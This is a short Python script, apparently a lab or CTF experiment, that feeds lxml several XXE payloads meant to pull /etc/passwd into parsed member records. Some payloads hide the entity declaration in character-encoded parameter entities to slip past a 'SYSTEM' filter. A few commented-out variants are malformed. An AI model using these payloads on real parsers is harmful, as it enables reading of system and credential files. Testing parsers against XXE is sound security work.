from flask import Flask, render_template, request, send_file
from lxml import etree
import pandas as pd

xml_data = """<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><members>
  <member>
    <name>&xxe;</name>
    <address>123 Main St</address>
    <company>Example Inc.</company>
    <job>Developer</job>
    <email>user@example.com</email>
    <username>user123</username>
  </member>
</members>
"""

xml_data = """
<!DOCTYPE foo [<!ENTITY % a "&#60;&#33;&#69;&#78;&#84;&#73;&#84;&#89;&#32;&#37;&#32;&#100;&#116;&#100;&#32;&#83;&#89;&#83;&#84;&#69;&#77;&#32;&#34;&#102;&#105;&#108;&#101;&#58;&#47;&#47;&#47;&#101;&#116;&#99;&#47;&#112;&#97;&#115;&#115;&#119;&#100;&#34;&#32;&#62;" >%a;%dtd;]>
<members>
  <member>
    <name>&exfil;</name>
    <address>123 Main St</address>
    <company>Example Inc.</company>
    <job>Developer</job>
    <email>user@example.com</email>
    <username>user123</username>
  </member>
</members>
"""
xml_data = """
<!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY % a "&#60;&#33;&#69;&#78;&#84;&#73;&#84;&#89;&#32;&#120;&#120;&#101;&#32;&#83;&#89;&#83;&#84;&#69;&#77;&#32;&#34;&#102;&#105;&#108;&#101;&#58;&#47;&#47;&#47;&#101;&#116;&#99;&#47;&#112;&#97;&#115;&#115;&#119;&#100;&#34;&#32;&#62;" >
    %a;
]>
<members>
  <member>
    <name>&xxe;</name>
    <address>123 Main St</address>
    <company>Example Inc.</company>
    <job>Developer</job>
    <email>user@example.com</email>
    <username>user123</username>
  </member>
</members>
"""
# xml_data = """<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe eval '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/passwd"></image></svg>'>]><members>
#   <member>
#     <name>&xxe;</name>
#     <address>123 Main St</address>
#     <company>Example Inc.</company>
#     <job>Developer</job>
#     <email>user@example.com</email>
#     <username>user123</username>
#   </member>
# </members>
# """
# xml_data = """
# <!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe >]>
# <members>
#   <member>
#     <name>&xxe;</name>
#     <address>123 Main St</address>
#     <company>Example Inc.</company>
#     <job>Developer</job>
#     <email>user@example.com</email>
#     <username>user123</username>
#   </member>
# </members>
# """
# xml_data = xml_data.decode('UTF-8')
xml_data = xml_data.replace("SYSTEM", "system")

xml_data = xml_data.encode('UTF-8')

print(xml_data)    
parser = etree.XMLParser(encoding='UTF-8')
try:
    root = etree.fromstring(xml_data, parser=parser)
except:
    root = etree.fromstring("<name>fail</name>", parser=parser)
    
data = []
for member in root.findall('member'):
    name = member.find('name').text
    address = member.find('address').text
    company = member.find('company').text
    job = member.find('job').text
    email = member.find('email').text
    username = member.find('username').text
    data.append([name, address, company, job, email, username])
        
print(data) 